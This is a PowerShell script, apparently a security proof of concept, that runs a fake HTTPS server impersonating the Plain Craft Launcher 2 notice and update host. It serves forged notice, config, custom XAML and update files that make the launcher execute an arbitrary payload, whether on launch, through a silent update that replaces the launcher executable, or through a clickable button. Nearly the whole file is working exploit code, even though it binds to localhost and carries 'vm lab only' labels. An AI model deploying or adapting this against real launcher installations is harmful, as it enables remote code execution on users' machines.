#Requires -Version 5.1
<#
.SYNOPSIS
    Pure PowerShell HTTPS server for the PCL2 notice.json PoC.

.DESCRIPTION
    Serves forged notice.cfg / notice.json / ServerConfig.json / update.zip /
    Custom.xaml over TLS on 127.0.0.1.  No Python required.

    The TLS certificate can come from either:
      - a certificate in Cert:\LocalMachine\My (pass -CertThumbprint), or
      - a PFX file (pass -PfxPath / -PfxPassword), useful for testing.

    Request handling is intentionally minimal: one GET per connection,
    HTTP/1.1, Connection: close.  PCL's HttpClient is fine with that.

.PARAMETER Mode
    launch | update | xaml | both

.PARAMETER CertThumbprint
    Thumbprint of a LocalMachine\My certificate with a private key.

.PARAMETER PfxPath
    Optional PFX file (testing / non-Windows PowerShell).

.EXAMPLE
    powershell -File .\server.ps1 -Mode update -Port 443 `
        -PayloadExe C:\Users\Public\pclpoc.exe -CertThumbprint ABC123...
#>
[CmdletBinding()]
param(
    [ValidateSet('launch', 'update', 'xaml', 'both')]
    [string]$Mode = 'both',

    [int]$Port = 443,

    [string]$Bind = '127.0.0.1',

    [string]$PayloadExe = 'C:\Users\Public\pclpoc.exe',

    [string]$CertThumbprint = '',

    [string]$PfxPath = '',

    [string]$PfxPassword = ''
)

$ErrorActionPreference = 'Stop'

$Domain        = 'pcl2-server-1253424809.file.myqcloud.com'
$NoticeId      = 11002
$ConfigVersion = 999
$BaseDir       = if ($PSScriptRoot) { $PSScriptRoot } else { Split-Path -Parent $MyInvocation.MyCommand.Path }
$WwwDir        = Join-Path $BaseDir 'www'

New-Item -ItemType Directory -Force -Path $WwwDir | Out-Null

function Write-SrvLog {
    param([string]$Message)
    Write-Host ('[{0:HH:mm:ss}] {1}' -f (Get-Date), $Message)
}

function Get-TlsCertificate {
    if ($PfxPath) {
        if (-not (Test-Path -LiteralPath $PfxPath)) {
            throw "PFX not found: $PfxPath"
        }
        $c = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2 -ArgumentList @($PfxPath, $PfxPassword)
        if (-not $c.HasPrivateKey) { throw "PFX has no private key: $PfxPath" }
        return $c
    }
    if (-not $CertThumbprint) {
        throw 'Either -CertThumbprint or -PfxPath is required.'
    }
    $path = $null
    foreach ($candidate in @("Cert:\LocalMachine\My\$CertThumbprint", "Cert:\CurrentUser\My\$CertThumbprint")) {
        if (Test-Path -LiteralPath $candidate) { $path = $candidate; break }
    }
    if (-not $path) {
        throw "Certificate not found in LocalMachine\My or CurrentUser\My: $CertThumbprint"
    }
    $c = Get-Item -LiteralPath $path
    if (-not $c.HasPrivateKey) {
        throw "Certificate has no private key: $path"
    }
    return $c
}

function ConvertTo-JsonText {
    param([object]$Object)
    return ($Object | ConvertTo-Json -Depth 12 -Compress)
}

function Build-NoticeJson {
    $setup   = @{}
    $actions = @{}

    if ($Mode -eq 'launch' -or $Mode -eq 'both') {
        $setup['LaunchAdvanceRun']     = $PayloadExe
        $setup['LaunchAdvanceRunWait'] = 'False'
    }
    if ($Mode -eq 'xaml' -or $Mode -eq 'both') {
        $setup['UiCustomType']      = '2'
        $setup['UiCustomNet']       = "https://$Domain/Custom.xaml"
        $setup['HintCustomCommand'] = 'True'
    }
    if ($setup.Count -gt 0) { $actions['setup'] = $setup }
    if ($Mode -eq 'update' -or $Mode -eq 'both') { $actions['slientupdate'] = @{} }

    $notice = @(
        @{
            id            = $NoticeId
            title         = 'VM LAB NOTICE'
            description   = 'vm lab only'
            requirements  = @{}
            importantLevel = 999
            actions       = $actions
        }
    )

    $json = ConvertTo-JsonText -Object $notice
    # Windows PowerShell 5.1 collapses a single-element array to an object.
    if (-not $json.TrimStart().StartsWith('[')) { $json = "[$json]" }
    return $json
}

function Build-ServerConfigJson {
    $cfg = @{
        Version = $ConfigVersion
        Update  = @{
            Release = @{
                DownloadUrls = @("https://$Domain/update.zip")
            }
        }
    }
    return (ConvertTo-JsonText -Object $cfg)
}

function Build-CustomXaml {
    return @"
<StackPanel Margin="25,40,23,15">
  <TextBlock Text="PCL PoC - click Continue" FontSize="16" Margin="0,0,0,10"/>
  <local:MyButton Text="Continue" EventType="4" EventData="$PayloadExe" Margin="0,6,0,0"/>
</StackPanel>
"@
}

function Ensure-UpdateZip {
    $zip = Join-Path $WwwDir 'update.zip'
    if (Test-Path -LiteralPath $zip) { return }
    if (-not (Test-Path -LiteralPath $PayloadExe)) {
        throw "Payload not found: $PayloadExe"
    }
    $tempRoot = [IO.Path]::GetTempPath()
    $tmp = Join-Path $tempRoot ('pclpoc-' + [guid]::NewGuid().ToString('N'))
    New-Item -ItemType Directory -Force -Path $tmp | Out-Null
    try {
        Copy-Item -LiteralPath $PayloadExe -Destination (Join-Path $tmp 'Plain Craft Launcher 2.exe') -Force
        if (Test-Path -LiteralPath $zip) { Remove-Item -LiteralPath $zip -Force }
        Compress-Archive -Path (Join-Path $tmp 'Plain Craft Launcher 2.exe') -DestinationPath $zip -Force
    } finally {
        Remove-Item -LiteralPath $tmp -Recurse -Force -ErrorAction SilentlyContinue
    }
    Write-SrvLog "update.zip built from $PayloadExe ($((Get-Item -LiteralPath $zip).Length) bytes)"
}

function Get-Response {
    param([string]$Path)

    switch ($Path) {
        '/notice.cfg' {
            $text = "$NoticeId|0|0|0|$ConfigVersion"
            return @{ Type = 'text/plain; charset=utf-8'; Bytes = [Text.Encoding]::UTF8.GetBytes($text) }
        }
        '/notice.json' {
            return @{ Type = 'application/json; charset=utf-8'; Bytes = [Text.Encoding]::UTF8.GetBytes((Build-NoticeJson)) }
        }
        '/ServerConfig.json' {
            return @{ Type = 'application/json; charset=utf-8'; Bytes = [Text.Encoding]::UTF8.GetBytes((Build-ServerConfigJson)) }
        }
        '/Custom.xaml.ini' {
            return @{ Type = 'text/plain; charset=utf-8'; Bytes = [Text.Encoding]::UTF8.GetBytes('1') }
        }
        '/Custom.xaml' {
            return @{ Type = 'application/xml; charset=utf-8'; Bytes = [Text.Encoding]::UTF8.GetBytes((Build-CustomXaml)) }
        }
        '/update.zip' {
            $zip = Join-Path $WwwDir 'update.zip'
            if (Test-Path -LiteralPath $zip) {
                return @{ Type = 'application/zip'; Bytes = [IO.File]::ReadAllBytes($zip) }
            }
        }
    }

    return @{ Type = 'text/plain'; Bytes = [Text.Encoding]::UTF8.GetBytes('not found'); Code = 404 }
}

# ---------------------------------------------------------------------------
# main
# ---------------------------------------------------------------------------
$cert = Get-TlsCertificate
if ($Mode -eq 'update' -or $Mode -eq 'both') { Ensure-UpdateZip }

$address  = [Net.IPAddress]::Parse($Bind)
$listener = New-Object Net.Sockets.TcpListener -ArgumentList @($address, $Port)
$listener.Start()

Write-SrvLog "https://${Bind}:$Port mode=$Mode"
Write-SrvLog "forged host: $Domain"

while ($true) {
    $client = $listener.AcceptTcpClient()
    $ssl    = $null
    try {
        $ssl = New-Object Net.Security.SslStream -ArgumentList @($client.GetStream(), $false)
        $ssl.AuthenticateAsServer($cert, $false, [Net.SecurityProtocolType]::Tls12, $false)

        $reader = New-Object IO.StreamReader -ArgumentList @($ssl, [Text.Encoding]::ASCII)
        $requestLine = $reader.ReadLine()
        if ([string]::IsNullOrEmpty($requestLine)) { continue }

        while ($true) {
            $header = $reader.ReadLine()
            if ($null -eq $header -or $header -eq '') { break }
        }

        $parts = $requestLine -split ' '
        if ($parts.Length -lt 2) { continue }
        $path = $parts[1].Split('?')[0]

        $resp   = Get-Response -Path $path
        $code   = if ($resp.ContainsKey('Code')) { $resp.Code } else { 200 }
        $status = if ($code -eq 200) { 'OK' } else { 'Not Found' }
        $headerText = "HTTP/1.1 $code $status`r`nContent-Type: $($resp.Type)`r`nContent-Length: $($resp.Bytes.Length)`r`nConnection: close`r`n`r`n"
        $headerBytes = [Text.Encoding]::ASCII.GetBytes($headerText)

        $ssl.Write($headerBytes, 0, $headerBytes.Length)
        $ssl.Write($resp.Bytes, 0, $resp.Bytes.Length)
        $ssl.Flush()
        Write-SrvLog "req $path -> $code"
    } catch {
        Write-SrvLog "err $($_.Exception.Message)"
    } finally {
        if ($ssl) { $ssl.Dispose() }
        $client.Close()
    }
}
